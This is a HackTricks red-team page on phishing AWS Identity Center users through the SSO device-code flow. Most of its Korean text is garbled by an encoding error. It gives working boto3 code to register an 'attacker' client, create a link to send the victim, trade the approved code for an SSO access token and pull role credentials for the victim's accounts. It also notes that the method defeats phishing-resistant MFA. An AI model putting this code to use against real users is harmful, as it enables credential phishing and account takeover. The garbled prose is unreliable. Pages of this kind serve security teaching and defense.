# AWS - Identity Center & SSO Unauthenticated Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)</strong>ë¥¼ í†µí•´ **ì œë¡œ**ë¶€í„° **íˆì–´ë¡œ**ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ **ë˜ê¸¸ ì›í•˜ê±°ë‚˜ **PDFë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ê¸°ì—¬í•˜ì„¸ìš”.

</details>

## AWS ë””ë°”ì´ìŠ¤ ì½”ë“œ í”¼ì‹±

ì´ˆê¸°ì— [**ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)ì—ì„œ ì œì•ˆëœ ê²ƒì²˜ëŸ¼, AWS SSOë¥¼ ì‚¬ìš©í•˜ëŠ” ì‚¬ìš©ìì—ê²Œ **ë§í¬**ë¥¼ ë³´ë‚´ë©´ **ì‚¬ìš©ìê°€ ìˆ˜ë½í•˜ë©´** ê³µê²©ìê°€ **ì‚¬ìš©ìë¥¼ í‰ë‚´ë‚´ëŠ” í† í°ì„ ì–»ì–´** **Identity Center**ì—ì„œ ì‚¬ìš©ìê°€ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì—­í• ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ê³µê²©ì„ ìˆ˜í–‰í•˜ë ¤ë©´ ë‹¤ìŒì´ í•„ìš”í•©ë‹ˆë‹¤:

- í”¼í•´ìê°€ **Identity Center**ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
- ê³µê²©ìëŠ” í”¼í•´ìê°€ ì‚¬ìš©í•˜ëŠ” **ì„œë¸Œë„ë©”ì¸**ì„ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤ `<victimsub>.awsapps.com/start`

ì´ì „ ì •ë³´ë§Œìœ¼ë¡œë„ **ê³µê²©ìëŠ” ì‚¬ìš©ìì—ê²Œ ë§í¬ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°**, ì‚¬ìš©ìê°€ **ìˆ˜ë½í•˜ë©´** **ê³µê²©ìê°€ AWS ì‚¬ìš©ì ê³„ì •ì— ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê³µê²©

1. **ì„œë¸Œë„ë©”ì¸ ì°¾ê¸°**

ê³µê²©ìì˜ ì²« ë²ˆì§¸ ë‹¨ê³„ëŠ” í”¼í•´ì íšŒì‚¬ê°€ Identity Centerì—ì„œ ì‚¬ìš©í•˜ëŠ” ì„œë¸Œë„ë©”ì¸ì„ ì°¾ëŠ” ê²ƒì…ë‹ˆë‹¤. ëŒ€ë¶€ë¶„ì˜ íšŒì‚¬ëŠ” ì—¬ê¸°ì— ìì‹ ì˜ ì´ë¦„ ë˜ëŠ” ì´ë¦„ì˜ ë³€í˜•ì„ ì‚¬ìš©í•  ê²ƒì´ë¯€ë¡œ **OSINT** ë˜ëŠ” **ì¶”ì¸¡ + BF**ë¥¼ í†µí•´ ì´ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì •ë³´ë¥¼ í†µí•´ **Identity Centerê°€ êµ¬ì„±ëœ ì§€ì—­ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:**
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **í”¼í•´ìë¥¼ ìœ„í•œ ë§í¬ ìƒì„± ë° ì „ì†¡**

ë‹¤ìŒ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ í”¼í•´ìê°€ ì¸ì¦í•  ìˆ˜ ìˆëŠ” AWS SSO ë¡œê·¸ì¸ ë§í¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.\
ë°ëª¨ë¥¼ ìœ„í•´ ì´ ì½”ë“œë¥¼ íŒŒì´ì¬ ì½˜ì†”ì—ì„œ ì‹¤í–‰í•˜ê³  ì¶”í›„ í† í°ì„ ì–»ê¸° ìœ„í•´ ì¼ë¶€ ê°ì²´ë¥¼ ìœ ì§€í•´ì•¼ í•©ë‹ˆë‹¤:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
3. **í”¼í•´ìê°€ ìˆ˜ë½í•  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦½ë‹ˆë‹¤**

í”¼í•´ìê°€ ì´ë¯¸ AWSì— ë¡œê·¸ì¸ë˜ì–´ ìˆìœ¼ë©´ ê¶Œí•œ ë¶€ì—¬ë¥¼ ìˆ˜ë½í•˜ê¸°ë§Œ í•˜ë©´ ë˜ì§€ë§Œ, ê·¸ë ‡ì§€ ì•Šì€ ê²½ìš° ë¡œê·¸ì¸í•œ í›„ ê¶Œí•œ ë¶€ì—¬ë¥¼ ìˆ˜ë½í•´ì•¼ í•©ë‹ˆë‹¤.\
í˜„ì¬ í”„ë¡¬í”„íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë³´ì…ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **SSO ì•¡ì„¸ìŠ¤ í† í° ê°€ì ¸ì˜¤ê¸°**

í”¼í•´ìê°€ í”„ë¡¬í”„íŠ¸ë¥¼ ìˆ˜ë½í•œ ê²½ìš°, ë‹¤ìŒ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ì‚¬ìš©ìë¥¼ í‰ë‚´ ë‚´ëŠ” SSO í† í°ì„ ìƒì„±í•©ë‹ˆë‹¤:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSO ì•¡ì„¸ìŠ¤ í† í°ì€ **8ì‹œê°„ ë™ì•ˆ ìœ íš¨**í•©ë‹ˆë‹¤.

5. **ì‚¬ìš©ìë¥¼ ì‚¬ì¹­í•©ë‹ˆë‹¤**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### "í”¼ì‹±í•  ìˆ˜ ì—†ëŠ” MFA"ë¥¼ í”¼ì‹±í•˜ê¸°

ì´ì „ ê³µê²©ì´ **"í”¼ì‹±í•  ìˆ˜ ì—†ëŠ” MFA" (webAuth)ë¥¼ ì‚¬ìš©í•˜ë”ë¼ë„ ì‘ë™í•œë‹¤ëŠ” ê²ƒì„ ì•Œì•„ì„œ ì¬ë¯¸ìˆëŠ” ì¼ì…ë‹ˆë‹¤**. ì´ëŠ” ì´ì „ **ì›Œí¬í”Œë¡œìš°ê°€ ì‚¬ìš©ëœ OAuth ë„ë©”ì¸ì„ ë²—ì–´ë‚˜ì§€ ì•Šê¸° ë•Œë¬¸**ì…ë‹ˆë‹¤. ì‚¬ìš©ìê°€ ë¡œê·¸ì¸ ë„ë©”ì¸ì„ ëŒ€ì²´í•´ì•¼ í•˜ëŠ” ë‹¤ë¥¸ í”¼ì‹± ê³µê²©ê³¼ëŠ” ë‹¬ë¦¬, ì¥ì¹˜ ì½”ë“œ ì›Œí¬í”Œë¡œìš°ëŠ” **ì¥ì¹˜ê°€ ì½”ë“œë¥¼ ì•Œê³  ìˆê¸° ë•Œë¬¸ì— ì‚¬ìš©ìê°€ ë‹¤ë¥¸ ê¸°ê¸°ì—ì„œë„ ë¡œê·¸ì¸í•  ìˆ˜ ìˆë„ë¡ ì¤€ë¹„**ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì‚¬ìš©ìê°€ í”„ë¡¬í”„íŠ¸ë¥¼ ìˆ˜ë½í•˜ë©´, **ì´ˆê¸° ì½”ë“œë¥¼ ì•Œê³  ìˆëŠ” ì¥ì¹˜**ë§Œìœ¼ë¡œë„ ì‚¬ìš©ìì˜ ìê²© ì¦ëª…ì„ **ê²€ìƒ‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” [**ì´ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”**](https://mjg59.dreamwidth.org/62175.html).

### ìë™ ë„êµ¬

* [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
* [https://github.com/sebastian-mora/awsssome\_phish](https://github.com/sebastian-mora/awsssome\_phish)

## ì°¸ê³  ìë£Œ

* [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
* [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
* [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
* [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ í™ë³´í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ë‹¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks ë° HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
